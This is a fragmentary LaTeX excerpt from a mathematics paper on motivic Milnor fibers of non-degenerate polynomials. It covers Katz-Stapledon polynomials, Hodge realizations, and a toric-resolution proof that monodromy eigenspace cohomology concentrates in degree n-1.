$\\pi^{-1}(V)$.\nWe denote by $m_{i}$ the order of zeros along $E_{i}$ of $f\\circ \\pi$.\nFor a subset $I\\subset \\{1,\\dots, m\\}$,\nwe define \n\\[E_{I}:=\\cap_{i\\in I}E_{i}, \\quad E_{I}^{\\circ}:=E_{I}\\setminus \\cup_{i\\notin I}E_{i}\\] and $m_{I}:=\\gcd_{i\\in I}(m_{i})$.\nMoreover, we define a covering $\\tl{E_{I}^{\\circ}}$ of $E_{I}^{\\circ}$ in the following way.\nFor a point in $E_{I}^{\\circ}$, we take a Zariski open neighborhood $U$ of it in $Y$\non which for any $i\\in I$ there exists a regular function $h_{i}$ such that $E_{i}\\cap U=\\{h_{i}=0\\}$.\nWe have $f\\circ \\pi=f_{1}f_{2}^{m_{I}}$ on $U$, where we set $f_{1}=(f\\circ \\pi)\\prod_{i\\in I}h_{i}^{-m_{i}}$ and $f_{2}=\\prod_{i\\in I}h_{i}^{m_{i}/m_{I}}$.\nNote that $f_{1}$ is a unit on $U$.\nThen, we have a covering of $E^{\\circ}_{I}\\cap U$ defined by\n\\begin{align}\\label{ecapu}\n\\{(z,y)\\in \\CC\\times (E^{\\circ}_{I}\\cap U)\\ |\\ z^{m_{I}}=f_{1}^{-1}(y) \\}.\n\\end{align}\nConsider an open covering of $E_{I}^{\\circ}$ by such affine open sets $E_{I}^{\\circ}\\cap U$.\nThen by gluing together the varieties (\\ref{ecapu}) in an obvious way, we obtain an $m_{I}$-fold covering $\\tl{E^{\\circ}_{I}}$ of $E_{I}^{\\circ}$.\nMoreover by the multiplication of $\\exp(2\\pi\\sqrt{-1}/m_{I})\\in\\CC$ to the $z$-coordinate of (\\ref{ecapu}),\nwe can endow $\\tl{E_{I}^{\\circ}}$ with a $\\mu_{m_{I}}$-action (and also a $\\muhat$-action induced by it).\nWe denote by $\\tl{E_{I,0}^{\\circ}}$ the base change of $\\tl{E_{I}^{\\circ}}\\lr E_{I}^{\\circ}$ by $\\pi^{-1}(0)\\cap E_{I}^{\\circ}\\hlr E_{I}^{\\circ}$.\nThen we obtain the following expression of $\\calS_{f,0}$.\n\\begin{prop}[Denef-Loeser~\\cite{DLarc}]\\label{fmot}\nIn the situation as above, we have\n\\begin{align}\\label{formot}\n\\calS_{f,0}= \\sum_{\\emptyset\\neq I\\subset \\{1,\\dots,m\\}}(1-\\LL)^{|I|-1}[\\tl{E^{\\circ}_{I,0}}] \n\\end{align}\nin $\\calM_{\\CC}^{\\muhat}$.\n\\end{prop}\n\nWe denote by $\\Sigma_{0}$ the dual fan of $\\Ntph$ in $\\RR^n$.\nLet $\\Sigma$ be a smooth subdivision of $\\Sigma_{0}$,\nand denote by $X_{\\Sigma}$ the toric variety associated with it.\nWe denote by $\\Sigma_{1}$ the fan which consists of all the faces of $\\RR^n_\n{\\geq 0}$. \nNote that the toric variety associated with it is $\\CC^n$.\nThen, the morphism of fans $\\Sigma\\lr \\Sigma_{1}$ induces a\nmorphism of toric varieties \n\\[\\pi \\colon X_{\\Sigma}\\lr \\CC^n.\\]\nIf $f$ is non-degenerate at $0$,\nwe can take $\\pi \\colon X_{\\Sigma}\\lr \\CC^n$ as a log resolution of $(\\CC^n, V)$ (In fact, $\\pi^{-1}(V)$ is normal crossing only in a neighborhood of $\\pi^{-1}(0)$ in $X_{\\Sigma}$.\nNevertheless, we can apply Proposition~\\ref{fmot}.).\nMoreover by calculating the right hand side of (\\ref{formot}),\nwe can describe the motivic Milnor fiber $S_{f,0}$ explicitly in terms of the Newton boundary $\\Ntbd$ as follows (see Matsui-Takeuchi~\\cite[Section~4]{MT}). \nAssume that $f(x)=\\sum_{\\alpha\\in\\ZZpn}a_{\\alpha}x^{\\alpha}$ ($a_{\\alpha}\\in\\CC$) is non-degenerate at $0$.\nFor a compact face $F$ of $\\Ntph$, we\ndefine a lattice polytope $\\Delta_{F}\\subset \\RR^n$ by $\\Delta_{F}:=\\Conv({F\\cup \\{0\\}})$.\nMoreover, we define a polynomial $\\tl{f_{\\Delta_{F}}}$ to be $f_{\\Delta_{F}}-1$.\nThen we define a hypersurface $Z^{\\circ}_{F}$ in $\\SPEC{\\CC[\\ZZ^n\\cap\\Aff{F}]}\\simeq \\CS^{\\dim{F}}$\nby\n\\[Z^{\\circ}_{F}=\\{x\\in \\SPEC{\\CC[\\ZZ^n\\cap\\Aff{F}]}\\ |\\ f_{F}(x)=0\\}\\subset \\CS^{\\dim{F}},\\]\nand a hypersurface $Z^{\\circ}_{\\Delta_{F}}$ in $\\SPEC{\\CC[\\ZZ^n\\cap \\Aff{\\Delta_{F}}]}\\simeq \\CS^{\\dim{F}+1}$ by\n\\[Z^{\\circ}_{\\Delta_{F}}=\\{x\\in \\SPEC{\\CC[\\ZZ^n\\cap\\Aff{\\Delta_{F}}]}\\ |\\ \\tl{f_{\\Delta_{F}}}(x)=0\\}\\subset \\CS^{\\dim{F}+1}.\\]\nWe endow $Z_{F}^{\\circ}$ with the trivial $\\muhat$-action,\nand $Z_{\\Delta_{F}}^{\\circ}$ with a good $\\muhat$-action in the following way.\nLet $\\nu_{F}$ be the linear function on $\\Aff{\\Delta_{F}}\\simeq \\RR^{\\dim{F}+1}$ which takes the value\n$1$ on $F$\nand $e_{F}\\in \\CS^{\\dim{F}+1}\\simeq \\SPEC{\\CC[\\ZZ^n\\cap\\Aff{\\Delta_{F}}]}\\simeq \\mathrm{Hom}_{\\mathrm{group}}(\\ZZ^n\\cap\\Aff(\\Delta_{F}),\\CC^*)$\nbe the element which corresponds to the group homomorphism\n\\[\\Exp\\left(2\\sqrt{-1}{\\nu_{F}(\\cdot)}\\right) \\in \\mathrm{Hom}_{\\mathrm{group}}(\\ZZ^n\\cap\\Aff(\\Delta_{F}),\\CC^*).\\]\nThen $Z^{\\circ}_{\\Delta_{F}}$ is invariant by the multiplication by $e_{F}$\nand hence we can endow $Z^{\\circ}_{\\Delta_{F}}$ with a $\\mu_{d_{F}}$-action.\nWe thus obtain the elements $[Z^{\\circ}_{{F}}\\circlearrowleft\\muhat]$ and $[Z^{\\circ}_{\\Delta_{F}}\\circlearrowleft\\muhat]$ in $\\calM^{\\muhat}_{\\CC}$ for any compact face $F\\prec \\Ntph$.\nFor a compact face $F$ of $\\Ntph$ we define also a subset $I_{F}\\subset \\{1,\\dots,n\\}$\nto be the minimal one such that $F\\subset \\RR^{I_{F}}$,\nand set $s_{F}=|I_{F}|$.\nThen we have the following theorem.\n\\begin{thm}[see~Matsui-Takeuchi~\\cite{MT}]\\label{motivicdesc}\nAssume that $f$ is non-degenerate at $0$.\nThen we have\n\\[\\calS_{f,0}=\\sum_{F\\prec \\Ntph\\colon \\mbox{\\tiny

in the sum $\\Sigma$ the face $F(\\neq \\emptyset)$ ranges through the compact ones of $\\Ntph$.   \n\\end{thm}\nThis theorem was proved only in the case where $f$ is convenient in \\cite{MT}.\nHowever, we can show it even if $f$ is not convenient similarly.\n\n\\subsection{Katz and Stapledon's polynomials}\\label{KaSpoly}\nIn this subsection, we introduce some polynomials defined by Katz-Stapledon~ \\cite{KaSthpoly}, \\cite{KaSttrop} and Stapledon~\\cite{SFM}.\nLet $P\\subset \\RR^n$ be a polytope in $\\RR^n$.\nIf a subset $F\\subset  P$ is a face of $P$ (possibly $F=P$ or $F= \\emptyset$), we write $F\\prec P$.\nFor a pair of faces $F\\prec F'$ of $P$,\nwe define $[F,F']$ to be the face poset $\\{F''\\prec P\\ |\\ F\\prec F''\\prec F'\\}$,\nand $[F,F']^*$ to

faces of $P$), we have $h(\\link_{\\calS_{\\nu}}(Q);t)=g([Q,P];t)$ and $l_{P}(\\calS_{\\nu},Q;t)=0$ for a face $Q$ of $P$.\nFor $\\lambda\\in\\CC$, $m\\in\\ZZ_{\\geq 0}$ and $v\\in mP\\cap

discuss the Hodge realization of $\\calS_{f,0}$.\nWe recall the proposition stated below for the Hodge realizations of non-degenerate hypersurfaces in the algebraic torus $\\CS^n$.\nLet

in \\cite{SFM} and \\cite{MT}\nfor an algebraic variety $X$ with a $\\mu_{m}$-action for some $m\\in\\ZZ_{\\geq 1}$ the authors endowed $H^{j}_{c}(X;\\QQ)$\nwith the inverse automorphism of the one which is defined by $(\\ref{actionl})$ in Section~\\ref{subsecmot}.\nTherefore, Proposition~\\ref{hodgereal} is slightly different from the original one in \\cite{SFM} and \\cite{MT}.\n\nLet $f(x)\\in\\nPoly$ be a non-constant polynomial such that $f(0)=0$ and assume that $f$ is non-degenerate at $0$.\nWe denote by $P$ the convex hull $\\Conv{(\\Ntbd\\cup\\{0\\})}$ of $\\Ntbd\\cup\\{0\\}$ in $\\RR^n$ and\ndefine a piecewise $\\QQ$-affine function $\\nu$ on $P$ which takes the value $0$ (resp. $1$)\nat the origin $0\\in\\RR^n$ (resp. on $\\Conv{(\\Ntbd)}$)\nsuch that for any compact face $F$ of $\\Ntph$ the restriction $\\nu_{F}$ of $\\nu$ to $\\Delta_{F}$ is linear.\nMoreover, for a compact face $F$ of $\\Ntph$ let $0_{F}$ be the zero function on $F$.\nThen by Theorem~\\ref{motivicdesc} and Proposition~\\ref{hodgereal}, we can calculate the Hodge realization of the motivic Milnor fiber $S_{f,0}$, and we can describe $E_{\\lambda}(F_{f,0};u,v)$ as

coefficient of $u^{p}v^{q}$ in $E_{\\lambda}(F_{f,0};u,v)$ being an alternating sum of $h^{p,q}_{\\lambda}(H^{j}(F_{f,0};\\CC))$, for each $j\\in\\ZZ$ we can not always compute $h^{p,q}_{\\lambda}(H^{j}(F_{f,0};\\CC))$ by the formula in Corollary~\\ref{epolycomp1}.\nRecall that if $0\\in V$ is an isolated singular point, we have $H^{j}(F_{f,0};\\CC)=0$ unless $j=0$ or $n-1$,\nand $h^{p,q}_{\\lambda}(H^{0}(F_{f,0};\\CC))=0$ unless $\\lambda=1$ and $(p,q)= (0,0)$.\nTherefore, in this case, we can compute each $h^{p,q}_{\\lambda}(H^{n-1}(F_{f,0};\\CC))$ by our

$H^{j}(F_{f,0};\\CC)_{\\lambda}=0\\ (j\\neq n-1)$\nand we can compute $h^{p,q}_{\\lambda}(H^{n-1}(F_{f,0};\\CC))$ (see Theorem~\\ref{main1}).\n\nLet us explain a symmetry of $E_{\\lambda}(F_{f,0};u,v)$.\n\\begin{defi}\\label{admissible}\nWe say that a compact face $F(\\neq \\emptyset)$ of $\\Ntph$ is \\textit{extremal} if there exists a non-compact face $G$ of $\\Ntph$

$X_{\\Sigma}$ contains $T:=\\CS^n$ as an open dense subset\nand it acts naturally on $X_{\\Sigma}$ itself.\nFor a cone $\\sigma\\in\\Sigma$, we denote by $T_{\\sigma}$ the $T$-orbit in $X_{\\Sigma}$ associated with it.\nLet $\\Sigma_{1}$ be the fan formed by all the faces of $\\RR^n_{\\geq 0}$.\nThen the toric variety associated with it is $\\CC^n$.\nMoreover, the morphism of fans $\\Sigma\\lr \\Sigma_{1}$ induces a proper morphism\n\\[\\pi\\colon X_{\\Sigma}\\lr \\CC^n\\]\nof toric varieties.\nSet $V':=\\pi^{-1}(V)$.\n\n\\begin{lem}\\label{pushconst1}\nIn the situation as above, we have an

construction of $\\Sigma$, one can easily show that\nthe morphism $\\pi$ induces an isomorphism\n\\[X_{\\Sigma}\\setminus V'\\simar \\CC^n\\setminus V.\\]\nHence we obtain an isomorphism\n\\[(\\DR\\pi_{*}\\CC_{X_{\\Sigma}})|_{\\CC^n\\setminus V}\\simeq \\CC_{\\CC^n\\setminus V}\\]\nin $\\DBC{\\CC^n\\setminus V}$.\nNow the desired assertion immediately follows from the definition of the nearby cycle functor.\n\\end{proof}\n\nIn what follows, we fix $\\lambda\\notin R_{f}$.\nConsider the following distinguished triangle in $\\DBC{\\{0\\}}\\simeq \\mathrm{D^b}(\\mathrm{Mod}(\\CC))$:\n\\begin{align*}\n(\\DR\\Gamma_{\\{0\\}}\\psi_{f,\\lambda}(\\CC_{\\CC^n}))_{0}\\lr\n\\psi_{f,\\lambda}(\\CC_{\\CC^n})_{0}\\lr\n(\\DR\\Gamma_{V\\setminus\\{0\\}}\\psi_{f,\\lambda}(\\CC_{\\CC^n}))_{0}\\overset{+1}{\\lr}.\n\\end{align*}\nThe

j^{-1}_{0}\\psi_{f,\\lambda}(\\CC_{\\CC^n}).\n\\end{align}\nTherefore, it is enough to show that $(\\DR\\Gamma_{V\\setminus\\{0\\}}\\psi_{f,\\lambda}(\\CC_{\\CC^n}))_{0}$ is isomorphic to $0$.\nConsider the Cartesian diagram:\n\\[\n\\xymatrix{\nV\\setminus\\{0\\} \\ar@{}[dr]|-{\\square}\\ar@{^(->}[r]^-{i} &V\\\\\nV'\\setminus\\pi^{-1}(0)\\ar[u]^{\\pi''}\\ar@{^(->}[r]^-{i'}& V'\\ar[u]_{\\pi'},\n}\n\\]\nwhere $i, i'$ are the inclusions and $\\pi', \\pi''$ are the restrictions of $\\pi$.\nSince $\\pi'$ and $\\pi''$ are proper, we obtain the following isomorphisms,\nwhere in the third isomorphism we used Proposition~4.2.11 of Dimca~\\cite{DIMCA}: \n\\begin{align}\n(\\DR\\Gamma_{V\\setminus\\{0\\}}\\psi_{f,\\lambda}(\\CC_{\\CC^n}))_{0}&=\n(\\DR

proof of Theorem~3.17 in Saito-Takeuchi~\\cite{SaiTake}.\nLet $\\rho_{1},\\dots, \\rho_{N}$ be the rays in $\\Sigma$.\nBy abuse of notation, we will use the same symbol $\\rho_{i}$ for the primitive vector on the ray $\\rho_{i}$. \nFor $1\\leq i\\leq N$, set\n\\[m_{\\rho_{i}}:=\\min_{\\alpha \\in \\Ntph}\\inpro{\\alpha}{\\rho_{i}}\\in\\ZZ_{\\geq 0},\\]\nwhere $\\inpro{\\alpha}{\\rho_{i}}$ is the inner product of $\\alpha$ and $\\rho_{i}$ in $\\RR^n$.\nWe may assume that for some $1\\leq l\\leq N$ we have\n$m_{\\rho_{i}}\\neq 0$ and $\\lambda^{m_{\\rho_{i}}}=1$ if and only if $1\\leq i\\leq l$,\nand for some $l\\leq l' \\leq N$ we have\n$m_{\\rho_{i}}=0$ if and only if $l'+1\\leq i\\leq N$.\nFor a cone $\\sigma\\in \\Sigma$ containing some $\\rho_{i}$ with $1\\leq i\\leq l'$, we also set\n\\[m_{\\sigma}:=\\gcd_{\\substack{1\\leq i\\leq l'\\\\\\rho_{i}\\prec \\sigma}}(m_{\\rho_{i}})\\in \\ZZ_{\\geq 1}.\\]\nFor $1\\leq i\\leq l'$ we denote by $E_{i}$ the closure $\\overline{T_{\\rho_{i}}}$ of $T_{\\rho_{i}}$ in $X_{\\Sigma}$.\nNote that the order of zeros of $f\\circ \\pi$ along the divisor $E_{i}$ is equal to $m_{\\rho_{i}}$.\nLet $Z$ be the strict transform of $V$ in $X_{\\Sigma}$.\nThen $V'=(f\\circ \\pi)^{-1}(0)$ has the following form\n\\[V'=E_{1}\\cup\\dots\\cup E_{l'}\\cup Z.\\]\nSince $f$ is non-degenerate at $0$, the divisor $V'$ is normal crossing in a neighborhood of $\\pi^{-1}(0)$.\nIn particular, $Z$ is smooth there.\nThus, for our discussion below we may assume $V'$ is normal crossing.\nFor a subset $I\\subset \\{1,\\dots,l\\}$,\nwe set\n\\[E_{I}:=\\bigcap_{i\\in I} E_{i}, \\quad E_{I}^{\\circ}:=E_{I}\\setminus(\\bigcup_{\\substack{1\\leq i\\leq l'\\\\ i\\notin I}}E_{i}\\cup Z) \\mbox{\\quad and\\quad} U_{I}:=E_{I}\\setminus(\\bigcup_{l+1\\leq i\\leq l'}E_{i}\\cup Z).\\]\nMoreover, we write $i_{I}$ and $j_{I}$ for the inclusion maps $i_{I}\\colon E_{I}^{\\circ}\\hlr E_{I}$ and $j_{I}\\colon U_{I}\\hlr E_{I}$ respectively.\nWe denote by $\\iota$ the inclusion map $\\iota\\colon X_{\\Sigma}\\setminus V'\\hlr X_{\\Sigma}$ and define a sheaf $\\calF_{\\lambda}$ on $X_{\\Sigma}$ by\n\\[\\calF_{\\lambda}:=\\iota_{*}(f\\circ\\pi|_{X_{\\Sigma}\\setminus V'})^{-1}\\calL_{\\lambda^{-1}},\\]\nwhere $\\calL_{\\lambda^{-1}}$ is the $\\CC$-local system on $\\CC^*$ of rank $1$ whose monodromy is given by the multiplication by $\\lambda^{-1}$. \nSince for $1\\leq i\\leq l'$ the monodromy of the local system $(f\\circ \\pi)^{-1}\\calL_{\\lambda^{-1}}$ around the divisor $E_{i}$ is given by $\\lambda^{-m_{\\rho_{i}}}$ , the restriction of $\\calF_{\\lambda}$ to $U_{I}$ is a local system of rank $1$.\nFor $I\\subset \\{1,\\dots,n\\}$, we set $\\calF_{\\lambda, I}=\\calF_{\\lambda}|_{E_{I}}$ and\nwrite $i_{E_{I}}$ for the inclusion $i_{E_{I}}\\colon E_{I}\\hlr V'$.\nThen, by the primitive decomposition of ${}^p\\psi_{f\\circ\\pi,\\lambda}(\\CC_{X_{\\Sigma}}[n])$ each graded piece of ${}^p\\psi_{f\\circ\\pi,\\lambda}(\\CC_{X_{\\Sigma}}[n])$ with respect to the filtration $W_{\\bullet}{}^p\\psi_{f\\circ\\pi,\\lambda}(\\CC_{X_{\\Sigma}}[n])$ is a direct sum of some perverse sheaves \n\\[{i_{E_{I}}}_{*}{j_{I}}_{!}j_{I}^{-1}\\calF_{\\lambda,I}[n-|I|](\\simeq {i_{E_{I}}}_{*}{j_{I}}_{*}j_{I}^{-1}\\calF_{\\lambda,I}[n-|I|])\\] for $I\\subset \\{1,\\dots,l\\}$ (see Section~1.4 of \\cite{somecons} and Section~4.2 of \\cite{IGUSA}). \nTherefore, to show that $(\\ref{vanish1})$ is isomorphic to $0$ in $\\mathrm{D^b}(\\mathrm{Mod}(\\CC))$,\nit suffices to show that for each $I\\subset \\{1,\\dots,l\\}$, we have\n\\begin{align}\\label{vanish2}\n\\DR\\Gamma(\\pi^{-1}(0);(\\DR \\Gamma_{V'\\setminus \\pi^{-1}(0)}({i_{E_{I}}}_{*}{j_{I}}_{!}j_{I}^{-1}\\calF_{\\lambda,I}))|_{\\pi^{-1}(0)})\\simeq 0.\n\\end{align}\nFix $I\\subset \\{1,\\dots, l\\}$ such that $E_{I}\\neq \\emptyset$.\nIf for some $i\\in I$ we have $E_{i}\\subset \\pi^{-1}(0)$,\nthe sheaf ${i'}^{-1}{i_{E_{I}}}_{*}{j_{I}}_{!}j_{I}^{-1}\\calF_{\\lambda,I}$ is zero.\nFor this reason, in what follows we may assume that $E_{i}\\not\\subset \\pi^{-1}(0)$ for any $i\\in I$.\nNamely, the ray $\\rho_{i}$ is contained in the boundary $\\partial\\RRpn$ of $\\RRpn$ for any $i\\in I$.\nBy the property of $\\calF_{\\lambda}$ stated above,\nwe can easily see the isomorphisms on $E_{I}$:\n\\begin{align}\n{j_{I}}_{!}j_{I}^{-1}\\calF_{\\lambda, I}\\simeq {j_{I}}_{*}j_{I}^{-1}\\calF_{\\lambda,I}\\simeq\n\\DR{j_{I}}_{*}{j_{I}}^{-1}\\calF_{\\lambda,I}\\simeq \\DR{\\Gamma}_{U_{I}}(\\calF_{\\lambda,I}).\n\\end{align}\nWe thus obtain\n\\[\\DR \\Gamma_{V'\\setminus \\pi^{-1}(0)}({i_{E_{I}}}_{*}{j_{I}}_{!}j_{I}^{-1}\\calF_{\\lambda,I})\\simeq {i_{E_{I}}}_{*}\\DR\\Gamma_{U_{I}\\setminus \\pi^{-1}(0)}(\\calF_{\\lambda,I})\\simeq \n{i_{E_{I}}}_{*}{j_{I}'}_{*}{j'_{I}}^{-1}\\calF_{\\lambda,I},\\]\nwhere we write $j_{I}'$ for the inclusion $j_{I}'\\colon U_{I}\\setminus \\pi^{-1}(0)\\hlr E_{I}$.\nNote that its restriction to the outside of $U_{I}$ in a small neighborhood of $\\pi^{-1}(0)$ is zero.\nTherefore, to show (\\ref{vanish2}), it is enough to show that\n\\begin{align}\\label{vanish3}\n\\DR\\Gamma_{c}(U_{I}\\cap \\pi^{-1}(0); (\\DR {j'_I}_{*}{j'_{I}}^{-1}\\calF_{\\lambda,I})|_{U_{I}\\cap \\pi^{-1}(0)})\\simeq 0.\n\\end{align}\nSince $E_{I}\\neq \\emptyset$, the cone $\\tau$ generated by the rays $\\{\\rho_{i}\\}_{i\\in I}$ is in $\\Sigma$.\nThe subvariety $U_{I}\\cap \\pi^{-1}(0)$ of $X_{\\Sigma}$ is the union of $T_{\\sigma}\\setminus Z$ for the cones $\\sigma\\in\\Sigma$ satisfying the following condition $(\\star)$:\n\\[\n(\\star)\\left\\{\\begin{array}{cl}\n(\\mathrm{i})&\\mbox{$\\tau$ is a face of $\\sigma$},\\\\\n(\\mathrm{ii})&\\mbox{$\\Relint{\\sigma}\\subset \\Int{\\RRpn}$ \\quad and}\\\\\n(\\mathrm{iii})&\\mbox{any ray $\\rho_{i}\\in\\Sigma$ contained in $\\sigma$ satisfies $\\lambda^{m_{\\rho_{i}}}=1$},\n\\end{array}\n\\right.\n\\]\nwhere $\\Relint{\\sigma}$ is the relative interior of $\\sigma$ and $\\Int{\\RRpn}$ is the interior of $\\RRpn$.\nNote that such $\\sigma$ may contain some rays $\\rho_{i}$ such that $i>l'$.\nTherefore, to show (\\ref{vanish3}), we shall show that\nfor any $\\sigma\\in\\Sigma$ with the condition ($\\star$) we have \n\\begin{align}\\label{vanish4}\n\\DR\\Gamma_{c}(T_{\\sigma}\\setminus Z; (\\DR{j'_{I}}_{*}{j'_{I}}^{-1}\\calF_{\\lambda,I})|_{T_{\\sigma}\\setminus Z})\\simeq 0.\n\\end{align}\nIn what follows, we fix a cone $\\sigma\\in\\Sigma$ with the condition ($\\star$).\nLet $\\tl{\\sigma}\\in \\Sigma_{0}$ be the unique cone in $\\Sigma_{0}$ such that\n$\\Relint{\\sigma}\\subset \\Int{\\tl{\\sigma}}$ \nand $F(\\tl{\\sigma})\\prec\\Ntph$ the face of $\\Ntph$ which corresponds to it. \nBy the condition $\\Relint{\\sigma}\\subset \\Int{\\RR^n_{\\geq 0}}$, the face $F(\\tl{\\sigma})$ is compact.\nWe denote by $d_{\\Ftsigma}$ the lattice distance of $\\Ftsigma$ from the origin $0\\in\\RR^n$.\nThen we can easily show the following assertion.\n\\begin{lem}\\label{hullsingmaeq}\nAssume that $\\dim\\sigma=\\dim \\tl{\\sigma}$.\nThen we have $m_{\\sigma}=d_{\\Ftsigma}$.\n\\end{lem}\nSuppose that $\\dim\\sigma=\\dim \\tl{\\sigma}$.\nSince for any $i\\in I$ we have $\\rho_{i}\\subset \\partial \\RR^n_{\\geq 0}$ and $m_{\\rho_{i}}>0$,\nthere exists a non-compact face $G$ of $\\Ntph$ containing $\\Ftsigma$ and $G\\not\\subset\\partial\\RRpn$.\nThen, by Lemma~\\ref{hullsingmaeq} and the assumption that $\\lambda\\notin R_{f}$,\nwe have $\\lambda^{m_{\\sigma}}=\\lambda^{d_{F(\\tl{\\sigma})}}\\neq 1$.\nTherefore, there exists a ray $\\rho_{i}$ in $\\sigma$ such that $\\lambda^{m_{\\rho_{i}}}\\neq 1$.\nThis contradicts our condition $(\\star)$.\nHence we have \n\\[\\dim\\sigma<\\dim \\tl{\\sigma}.\\]\nTake a cone $\\sigma'\\in \\Sigma$ such that\n$\\sigma\\prec \\sigma' \\subset \\tl{\\sigma}$ and $\\dim\\sigma'=\\dim \\tl{\\sigma}$.\nThen by the argument as above,\nwe have $\\lambda^{m_{\\sigma'}}\\neq 1$.\nThus, by the condition $(\\star)$ it follows that there exists a ray $\\rho_{i}\\prec \\sigma'$ such that $\\rho_{i}\\not\\prec \\sigma$ and\n\\begin{align}\\label{neq1nosiki}\n\\lambda^{m_{\\rho_{i}}}\\neq 1.\n\\end{align}\nMoreover, take a $n$-dimensional cone $\\sigma''\\in\\Sigma$ such that $\\sigma'\\prec\\sigma''$.\nLet $\\Edge(\\tau)$, $\\Edge(\\sigma)$, $\\Edge(\\sigma')$ and $\\Edge(\\sigma'')$\nbe the sets of edges (i.e rays $\\rho_{i}$) of the smooth cones $\\tau$, $\\sigma$, $\\sigma'$ and $\\sigma''$ respectively.\nWe assume that for some $1\\leq i_{1}\\leq i_{2}<i_{3}\\leq i_{4}\\leq n$ we have\n\\begin{align*}\n\\Edge(\\tau)&=\\{\\xi_{1},\\dots,\\xi_{i_{1}}\\},\\\\\n\\Edge(\\sigma)&=\\{\\xi_{1},\\dots,

$s_{2}:=i_{2}-i_{1}$, $s_{3}:=i_{3}-i_{2}$, $s_{4}:=n-i_{3}$.\nNote that by the condition $\\sigma\\Precneq \\sigma'$ we have $s_{3}>0$.\nSince $\\sigma''$ is a smooth cone,\nthe affine open subset $\\CC^n(\\sigma'')\\simeq\\CC^n$ of $X_{\\Sigma}$ associated with $\\sigma''$ has a natural decomposition:\n\\[\\CC^n(\\sigma'')=\\CC^{s_{1}}\\times \\CC^{s_{2}}\\times \\CC^{s_{3}}\\times \\CC^{s_{4}}.\\]\nLet\n\\[(x_{1},\\dots,x_{s_{1}},y_{1},\\dots,y_{s_{2}},z_{1},\\dots, z_{s_{3}},w_{1},\\dots,w_{s_{4}})\\]\nbe the corresponding coordinates of $\\CC^n(\\sigma'')$.\nIn $\\CC(\\sigma'')\\simeq \\CC^n$, we have\n\\begin{align*}\nE_{I}&=\\{0\\}\\times \\CC^{s_{2}}\\times \\CC^{s_{3}}\\times \\CC^{s_{4}} \\qquad\\mbox{and}\\\\\nT_{\\sigma}&=\\{0\\}\\times\\{0\\}\\times\\CS^{s_{3}}\\times\\CS^{s_{4}}.\n\\end{align*}\nFor any $i_{2}+1\\leq i\\leq i_{3}$ the function $\\inpro{\\xi_{i}}{\\cdot}$ is constant on $F(\\tl{\\sigma})$.\nSince $f$ is non-degenerate at $0$,\n$T_{\\sigma}\\cap Z$ is smooth and its defining polynomial in $T_{\\sigma}$ can be described by\n\\[f\\circ \\pi=z_{1}^{m_{\\xi_{i_{2}+1}}}\\dots z_{s_{3}}^{m_{\\xi_{i_{3}}}}g(w_{1},\\dots,w_{s_{4}}),\\]\nwhere $g(w_{1},\\dots, w_{s_{4}})\\in\\CC[w_{1},\\dots,w_{s_{4}}]$.\nWe denote by $W$ the zero set of $g(w_{1},\\dots,w_{s_{4}})$ in $\\CS^{s_{4}}$.\nThen we have\n\\[T_{\\sigma}\\cap Z=\\{0\\}\\times \\{0\\}\\times \\CS^{s_{3}}\\times W,\\]\nand\n\\[T_{\\sigma}\\setminus Z=\\{0\\}\\times \\{0\\}\\times \\CS^{s_{3}}\\times (\\CS^{s_{4}}\\setminus W).\\]\nLet $p_{3}$ be the projection $p_{3}\\colon T_{\\sigma}\\setminus Z=\\CS^{s_{3}}\\times (\\CS^{s_{4}}\\setminus W)\\lr\\CS^{s_{3}}$,\nand $p_{4}$ be the projection $p_{4}\\colon T_{\\sigma}\\setminus Z=\\CS^{s_{3}}\\times (\\CS^{s_{4}}\\setminus W)\\lr \\CS^{s_{4}}\\setminus W$. \nWe define $\\calL_{3}$ by the $\\CC$-local system on $\\CS^{s_{3}}$ of rank $1$ whose monodromy around the divisor $\\{(z_{1},\\dots,z_{s_{3}})\\in \\CC^{s_{3}}\\ |\\ z_{t}=0\\}$ is given by the multiplication by $\\lambda^{-m_{\\xi_{(i_{2}+t)}}}$ for each $1\\leq t\\leq s_{3}$.\nNote that by $(\\ref{neq1nosiki})$ there exists $i_{2}+1\\leq i\\leq i_{3}$ such that\n\\begin{align}\\label{neq1nosiki3}\n\\lambda^{-m_{\\xi_{i}}}\\neq 1.\n\\end{align}\nBy the definition of $\\calF_{\\lambda,I}$, one can show that there exist a $\\CC$-local system $\\calL_{4}$ on $\\CS^{s_{4}}\\setminus W$ and a complex $C^{\\bullet}$ of $\\CC$-vector spaces such that\n\\[(\\DR{j'_{I}}_{*}{j'_{I}}^{-1}\\calF_{I,\\lambda})|_{T_{\\sigma}\\setminus Z}\\simeq C^{\\bullet}\\otimes_{\\CC}p_{3}^{-1}\\calL_{3}\\otimes _{\\CC}p_{4}^{-1}\\calL_{4}.\\]\nRecall that for any non-trivial $\\CC$-local system $\\calL$ on $\\CC^*$ of rank $1$, we have $H^{j}(\\CC^*;\\calL)\\simeq 0$ for all $j\\in\\ZZ$.\nHence, by the K\\\"unneth formula and (\\ref{neq1nosiki3})\nwe deduce the vanishing $(\\ref{vanish4})$.\nThis completes the proof that the morphism~(\\ref{firsteq}) is isomorphism\nand the proof of Proposition~\\ref{compare1prop}.\n\\end{proof\n\n\\begin{proof}[Proof of Theorem~\\ref{main1}\nRecall that the complex \n$^{p}\\psi_{f,\\lambda}(\\CC_{\\CC^n}{[n]})=\\psi_{f,\\lambda}(\\CC_{\\CC^n}{[n-1]}) \\in \\DBC{V}$ is a perverse sheaf.\nBy the fact that the functor $j_{0}^{-1} \\colon \\DBC{V}\\lr \\DBC{\\{0\\}}$ (resp. $j_{0}^{!} \\colon \\DBC{V}\\lr \\DBC{\\{0\\}}$) is right (resp. left) $t$-exact,\nit follows from Proposition~\\ref{compare1prop} that $j_{0}^{-1}({}^{p}\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))$ is a perverse sheaf on $\\{0\\}$.\nHence the cohomology group \n\\[H^{j}(j_{0}^{-1}({}^{p}\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])))\\simeq H^{j+n-1}(F_{f,0};\\CC)_{\\lambda}\\] vanishes for $j\\neq 0$.\nWe thus obtain the desired concentration.\n\\end{proof}\n\n\nRecall that the cohomology groups $H^{j}(F_{f,0};\\QQ)$ of the Milnor fiber are endowed with mixed Hodge structures.\nSince we do not assume here that $f$ is convenient,\nwe can not expect that their weight filtrations coincide with the monodromy filtrations in

